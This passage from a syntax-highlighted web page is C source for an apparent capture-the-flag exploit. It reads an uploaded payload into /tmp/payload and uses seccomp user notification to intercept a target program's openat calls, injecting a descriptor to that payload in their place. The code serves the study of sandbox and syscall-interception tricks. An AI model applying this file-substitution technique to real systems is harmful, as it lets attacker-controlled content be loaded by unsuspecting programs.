class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;limits.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/audit.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/un.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> errExit(msg)    \</span><br><span class="hljs-meta">  do                    \</span><br><span class="hljs-meta">  &#123;                     \</span><br><span class="hljs-meta">    perror(msg);        \</span><br><span class="hljs-meta">    exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">  &#125; while (0)</span><br><br><span class="hljs-comment">/* Send the file descriptor &#x27;fd&#x27; over the connected UNIX domain socket</span><br><span class="hljs-comment">  &#x27;sockfd&#x27;. Returns 0 on success, or -1 on error. */</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sendfd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockfd, <span class="hljs-keyword">int</span> fd)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-keyword">int</span> data;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* Allocate a char array of suitable size to hold the ancillary data.</span><br><span class="hljs-comment">     However, since this buffer is in reality a &#x27;struct cmsghdr&#x27;, use a</span><br><span class="hljs-comment">     union to ensure that it is suitably aligned. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-keyword">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))];<br>    <span class="hljs-comment">/* Space large enough to hold an &#x27;int&#x27; */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to specify the address of the</span><br><span class="hljs-comment">     destination socket when sending a datagram. However, we do not</span><br><span class="hljs-comment">     need to use this field because &#x27;sockfd&#x27; is a connected socket. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* On Linux, we must transmit at least one byte of real data in</span><br><span class="hljs-comment">     order to send ancillary data. We transmit an arbitrary integer</span><br><span class="hljs-comment">     whose value is ignored by recvfd(). */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data;<br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>);<br>  data = <span class="hljs-number">12345</span>;<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Set up ancillary data describing file descriptor to send */</span><br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br>  cmsgp-&gt;cmsg_level = SOL_SOCKET;<br>  cmsgp-&gt;cmsg_type = SCM_RIGHTS;<br>  cmsgp-&gt;cmsg_len = CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>  <span class="hljs-built_in">memcpy</span>(CMSG_DATA(cmsgp), &amp;fd, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br><br>  <span class="hljs-comment">/* Send real plus ancillary data */</span><br><br>  <span class="hljs-keyword">if</span> (sendmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/* Receive a file descriptor on a connected UNIX domain socket. Returns</span><br><span class="hljs-comment">  the received file descriptor on success, or -1 on error. */</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">recvfd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockfd)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msgh</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>;</span><br>  <span class="hljs-keyword">int</span> data, fd;<br>  <span class="hljs-keyword">ssize_t</span> nr;<br><br>  <span class="hljs-comment">/* Allocate a char buffer for the ancillary data. See the comments</span><br><span class="hljs-comment">     in sendfd() */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-keyword">char</span> buf[CMSG_SPACE(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>))];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> <span class="hljs-title">align</span>;</span><br>  &#125; controlMsg;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cmsghdr</span> *<span class="hljs-title">cmsgp</span>;</span><br><br>  <span class="hljs-comment">/* The &#x27;msg_name&#x27; field can be used to obtain the address of the</span><br><span class="hljs-comment">     sending socket. However, we do not need this information. */</span><br><br>  msgh.msg_name = <span class="hljs-literal">NULL</span>;<br>  msgh.msg_namelen = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">/* Specify buffer for receiving real data */</span><br><br>  msgh.msg_iov = &amp;iov;<br>  msgh.msg_iovlen = <span class="hljs-number">1</span>;<br>  iov.iov_base = &amp;data; <span class="hljs-comment">/* Real data is an &#x27;int&#x27; */</span><br>  iov.iov_len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>);<br><br>  <span class="hljs-comment">/* Set &#x27;msghdr&#x27; fields that describe ancillary data */</span><br><br>  msgh.msg_control = controlMsg.buf;<br>  msgh.msg_controllen = <span class="hljs-keyword">sizeof</span>(controlMsg.buf);<br><br>  <span class="hljs-comment">/* Receive real plus ancillary data; real data is ignored */</span><br><br>  nr = recvmsg(sockfd, &amp;msgh, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>  cmsgp = CMSG_FIRSTHDR(&amp;msgh);<br><br>  <span class="hljs-comment">/* Check the validity of the &#x27;cmsghdr&#x27; */</span><br><br>  <span class="hljs-keyword">if</span> (cmsgp == <span class="hljs-literal">NULL</span> || cmsgp-&gt;cmsg_len != CMSG_LEN(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)) ||<br>      cmsgp-&gt;cmsg_level != SOL_SOCKET || cmsgp-&gt;cmsg_type != SCM_RIGHTS)<br>  &#123;<br>    errno = EINVAL;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">/* Return the received file descriptor to our caller */</span><br><br>  <span class="hljs-built_in">memcpy</span>(&amp;fd, CMSG_DATA(cmsgp), <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<br>  <span class="hljs-keyword">return</span> fd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sigchldHandler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">// char msg[] = &quot;\tS: target has terminated; bye\n&quot;;</span><br><br>  <span class="hljs-comment">// write(STDOUT_FILENO, msg, sizeof(msg) - 1);</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Child exited&quot;</span>);<br>  _exit(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">seccomp</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> operation, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">void</span> *args)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_seccomp, operation, flags, args);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> X32_SYSCALL_BIT 0x40000001</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR                                  \</span><br><span class="hljs-meta">  BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, arch))),   \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 0, 2),            \</span><br><span class="hljs-meta">      BPF_STMT(BPF_LD | BPF_W | BPF_ABS, (offsetof(struct seccomp_data, nr))), \</span><br><span class="hljs-meta">      BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, X32_SYSCALL_BIT, 0, 1),              \</span><br><span class="hljs-meta">      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS)</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">installNotifyFilter</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> &#123;<br>      X86_64_CHECK_ARCH_AND_LOAD_SYSCALL_NR,<br><br>      BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_USER_NOTIF),<br><br>      BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),<br>  &#125;;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span> =</span> &#123;<br>      .len = <span class="hljs-keyword">sizeof</span>(filter) / <span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>]),<br>      .filter = filter,<br>  &#125;;<br><br>  <span class="hljs-keyword">int</span> notifyFd =<br>      seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_NEW_LISTENER, &amp;prog);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;seccomp-install-notify-filter&quot;</span>);<br><br>  <span class="hljs-keyword">return</span> notifyFd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">closeSocketPair</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">0</span>]) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;closeSocketPair-close-0&quot;</span>);<br>  <span class="hljs-keyword">if</span> (close(sockPair[<span class="hljs-number">1</span>]) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;closeSocketPair-close-1&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">pid_t</span> <span class="hljs-title">targetProcess</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>], <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">pid_t</span> targetPid = fork();<br>  <span class="hljs-keyword">if</span> (targetPid == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;fork&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (targetPid &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">/* In parent, return PID of child */</span><br>    <span class="hljs-keyword">return</span> targetPid;<br><br>  <span class="hljs-keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>    errExit(<span class="hljs-string">&quot;prctl&quot;</span>);<br><br>  <span class="hljs-keyword">int</span> notifyFd = installNotifyFilter();<br><br>  <span class="hljs-keyword">if</span> (sendfd(sockPair[<span class="hljs-number">0</span>], notifyFd) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;sendfd&quot;</span>);<br><br>  <span class="hljs-comment">/* Notification and socket FDs are no longer needed in target */</span><br><br>  <span class="hljs-keyword">if</span> (close(notifyFd) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;close-target-notify-fd&quot;</span>);<br><br>  closeSocketPair(sockPair);<br><br>  <span class="hljs-comment">/* Perform a mkdir() call for each of the command-line arguments */</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Executing child&quot;</span>);<br>  sleep(<span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">char</span> *f = <span class="hljs-literal">NULL</span>;<br>  execve(<span class="hljs-string">&quot;/home/pwn/readme&quot;</span>, &amp;f, &amp;f);<br>  <span class="hljs-comment">// openat(AT_FDCWD,&quot;/bin/bash&quot;,0);</span><br>  <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">allocSeccompNotifBuffers</span><span class="hljs-params">(struct seccomp_notif **req,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     struct seccomp_notif_resp **resp,</span></span><br><span class="hljs-params"><span class="hljs-function">                                     struct seccomp_notif_sizes *sizes)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span> (seccomp(SECCOMP_GET_NOTIF_SIZES, <span class="hljs-number">0</span>, sizes) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;seccomp-SECCOMP_GET_NOTIF_SIZES&quot;</span>);<br><br>  *req = <span class="hljs-built_in">malloc</span>(sizes-&gt;seccomp_notif);<br>  <span class="hljs-keyword">if</span> (*req == <span class="hljs-literal">NULL</span>)<br>    errExit(<span class="hljs-string">&quot;malloc-seccomp_notif&quot;</span>);<br><br>  <span class="hljs-keyword">size_t</span> resp_size = sizes-&gt;seccomp_notif_resp;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">sizeof</span>(struct seccomp_notif_resp) &gt; resp_size)<br>    resp_size = <span class="hljs-keyword">sizeof</span>(struct seccomp_notif_resp);<br><br>  *resp = <span class="hljs-built_in">malloc</span>(resp_size);<br>  <span class="hljs-keyword">if</span> (resp == <span class="hljs-literal">NULL</span>)<br>    errExit(<span class="hljs-string">&quot;malloc-seccomp_notif_resp&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleNotifications</span><span class="hljs-params">(<span class="hljs-keyword">int</span> notifyFd)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_sizes</span> <span class="hljs-title">sizes</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif</span> *<span class="hljs-title">req</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_resp</span> *<span class="hljs-title">resp</span>;</span><br>  <span class="hljs-keyword">char</span> path[PATH_MAX];<br><br>  allocSeccompNotifBuffers(&amp;req, &amp;resp, &amp;sizes);<br><br>  <span class="hljs-comment">/* Loop handling notifications */</span><br><br>  <span class="hljs-keyword">for</span> (;;)<br>  &#123;<br>    <span class="hljs-comment">/* Wait for next notification, returning info in &#x27;*req&#x27; */</span><br><br>    <span class="hljs-built_in">memset</span>(req, <span class="hljs-number">0</span>, sizes.seccomp_notif);<br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_RECV, req) == <span class="hljs-number">-1</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (errno == EINTR)<br>        <span class="hljs-keyword">continue</span>;<br>      errExit(<span class="hljs-string">&quot;\tS: ioctl-SECCOMP_IOCTL_NOTIF_RECV&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (req-&gt;data.nr != __NR_openat)<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<br>          <span class="hljs-string">&quot;\tS: notification contained unexpected &quot;</span><br>          <span class="hljs-string">&quot;system call number; bye!!!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seccomp_notif_addfd</span> <span class="hljs-title">addfd</span>;</span><br>    addfd.id = req-&gt;id; <span class="hljs-comment">/* Cookie from SECCOMP_IOCTL_NOTIF_RECV */</span><br>    addfd.srcfd = openat(req-&gt;data.args[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;/tmp/payload&quot;</span>, req-&gt;data.args[<span class="hljs-number">2</span>], req-&gt;data.args[<span class="hljs-number">3</span>]);<br>    addfd.newfd = <span class="hljs-number">3</span>;<br>    addfd.flags = SECCOMP_ADDFD_FLAG_SETFD;<br>    addfd.newfd_flags = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> a2 = ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_ADDFD, &amp;addfd);<br><br>    resp-&gt;id = req-&gt;id;<br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br>    resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;error = resp-&gt;val = <span class="hljs-number">0</span>;<br>    resp-&gt;val = a2;<br><br>    resp-&gt;flags = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (ioctl(notifyFd, SECCOMP_IOCTL_NOTIF_SEND, resp) == <span class="hljs-number">-1</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (errno == ENOENT)<br>        <span class="hljs-built_in">printf</span>(<br>            <span class="hljs-string">&quot;\tS: response failed with ENOENT; &quot;</span><br>            <span class="hljs-string">&quot;perhaps target process&#x27;s syscall was &quot;</span><br>            <span class="hljs-string">&quot;interrupted by a signal?\n&quot;</span>);<br>      <span class="hljs-keyword">else</span><br>        perror(<span class="hljs-string">&quot;ioctl-SECCOMP_IOCTL_NOTIF_SEND&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-built_in">free</span>(req);<br>  <span class="hljs-built_in">free</span>(resp);<br>  <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* Implementation of the supervisor process:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  (1) obtains the notification file descriptor from &#x27;sockPair[1]&#x27;</span><br><span class="hljs-comment">  (2) handles notifications that arrive on that file descriptor. */</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">supervisor</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> notifyFd = recvfd(sockPair[<span class="hljs-number">1</span>]);<br>  <span class="hljs-keyword">if</span> (notifyFd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;recvfd&quot;</span>);<br><br>  closeSocketPair(sockPair); <span class="hljs-comment">/* We no longer need the socket pair */</span><br><br>  handleNotifications(notifyFd);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">readBinary</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> sz, readed;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size:&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;sz);<br>  <span class="hljs-keyword">char</span> *buf = <span class="hljs-built_in">malloc</span>(sz);<br><br>  <span class="hljs-keyword">int</span> f = open(<span class="hljs-string">&quot;/tmp/payload&quot;</span>, O_WRONLY | O_CREAT, <span class="hljs-number">0777</span>);<br>  <span class="hljs-keyword">while</span> (sz &gt; <span class="hljs-number">0</span>)<br>  &#123;<br>    readed = read(<span class="hljs-number">0</span>, buf, sz);<br>    write(f, buf, readed);<br>    sz -= readed;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> sockPair[<span class="hljs-number">2</span>];<br><br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>  readBinary();<br>  <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sockPair) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;socketpair&quot;</span>);<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">sa</span>;</span><br>  sa.sa_handler = 